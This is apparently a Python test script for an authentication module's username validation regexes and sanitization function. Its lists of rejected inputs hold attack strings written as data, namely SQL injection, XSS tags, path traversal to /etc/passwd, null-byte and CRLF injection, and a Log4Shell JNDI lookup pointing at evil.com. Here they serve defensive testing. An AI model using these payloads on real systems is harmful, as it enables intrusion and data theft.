#!/usr/bin/env python3
"""
Core Authentication Logic Test
Tests the authentication patterns and validation without FastAPI dependencies
"""

import re

# Copy the core patterns from auth.py for testing
USERNAME_PATTERN = re.compile(r'^[a-zA-Z0-9._-]{1,50}$')
DOMAIN_PATTERN = re.compile(r'^[a-zA-Z0-9.-]{1,100}\\[a-zA-Z0-9._-]{1,50}$')

def sanitize_username(username: str):
    """Core username sanitization logic"""
    if not username or not isinstance(username, str):
        return None
    
    # Strip whitespace and convert to lowercase for consistency
    username = username.strip().lower()
    
    # Handle domain\username format
    if '\\' in username:
        if not DOMAIN_PATTERN.match(username):
            print(f"Invalid domain username format: {username[:20]}...")
            return None
        # Extract just the username part after domain
        username = username.split('\\', 1)[1]
    
    # Validate username format
    if not USERNAME_PATTERN.match(username):
        print(f"Invalid username format: {username[:20]}...")
        return None
    
    return username

def test_username_patterns():
    """Test username pattern validation"""
    print("Testing Username Patterns...")
    
    # Valid usernames
    valid_usernames = [
        "rcox", "mikeh", "tomj", "user123", 
        "test.user", "user-name", "user_name"
    ]
    
    print("Testing valid usernames:")
    for username in valid_usernames:
        if USERNAME_PATTERN.match(username):
            print(f"  ✅ {username}")
        else:
            print(f"  ❌ {username} (should be valid)")
            return False
    
    # Invalid/malicious usernames
    malicious_usernames = [
        "user'; DROP TABLE users;--",
        "user<script>alert('xss')</script>",
        "user&lt;script&gt;",
        "user/../../../etc/passwd",
        "user\x00admin",
        "user\r\nadmin",
        "user%27%20OR%201=1",
        "user' OR 1=1--",
        "user\\..\\admin",
        "user${jndi:ldap://evil.com}",
        "",  # Empty username
        "a" * 51,  # Too long username
    ]
    
    print("Testing malicious usernames:")
    for username in malicious_usernames:
        if not USERNAME_PATTERN.match(username):
            print(f"  ✅ Blocked: {username[:30]}...")
        else:
            print(f"  ❌ SECURITY RISK - Allowed: {username[:30]}...")
            return False
    
    return True

def test_domain_patterns():
    """Test domain username patterns"""
    print("\nTesting Domain Patterns...")
    
    # Valid domain usernames
    valid_domains = [
        "DOMAIN\\rcox", "company.com\\user", "sub.domain.com\\test"
    ]
    
    print("Testing valid domain usernames:")
    for domain_user in valid_domains:
        if DOMAIN_PATTERN.match(domain_user):
            print(f"  ✅ {domain_user}")
        else:
            print(f"  ❌ {domain_user} (should be valid)")
            return False
    
    # Invalid/malicious domain usernames
    malicious_domains = [
        "domain\\user'; DROP TABLE;--",
        "domain<script>\\user",
        "domain\\user/../../../etc",
        "domain\\user\x00admin",
    ]
    
    print("Testing malicious domain usernames:")
    for domain_user in malicious_domains:
        if not DOMAIN_PATTERN.match(domain_user):
            print(f"  ✅ Blocked: {domain_user[:30]}...")
        else:
            print(f"  ❌ SECURITY RISK - Allowed: {domain_user[:30]}...")
            return False
    
    return True

def test_sanitization():
    """Test username sanitization function"""
    print("\nTesting Sanitization Function...")
    
    test_cases = [
        # (input, expected_output)
        ("rcox", "rcox"),
        ("RCOX", "rcox"),  # Should lowercase
        ("  user123  ", "user123"),  # Should strip whitespace
        ("DOMAIN\\user", "user"),  # Should extract username from domain
        ("user'; DROP TABLE;--", None),  # Should reject SQL injection
        ("user<script>", None),  # Should reject XSS
        ("", None),  # Should reject empty
        ("a" * 51, None),  # Should reject too long
    ]
    
    for input_val, expected in test_cases:
        result = sanitize_username(input_val)
        if result == expected:
            print(f"  ✅ '{input_val}' -> '{result}'")
        else:
            print(f"  ❌ '{input_val}' -> '{result}' (expected '{expected}')")
            return False
    
    return True

def main():
    """Run all core logic tests"""
    print("🔒 Testing Core Authentication Logic")
    print("=" * 60)
    
    tests = [
        test_username_patterns,
        test_domain_patterns, 
        test_sanitization
    ]
    
    passed = 0
    total = len(tests)
    
    for test in tests:
        try:
            if test():
                passed += 1
                print(f"\n✅ {test.__name__} PASSED")
            else:
                print(f"\n❌ {test.__name__} FAILED")
        except Exception as e:
            print(f"\n💥 {test.__name__} CRASHED: {e}")
    
    print("=" * 60)
    print(f"Results: {passed}/{total} core tests passed")
    
    if passed == total:
        print("🎉 All core authentication logic tests passed!")
        print("✅ Security patterns are working correctly")
        return 0
    else:
        print("⚠️  Some core authentication tests failed")
        print("🚨 Security vulnerabilities may exist")
        return 1

if __name__ == "__main__":
    exit_code = main()
    exit(exit_code)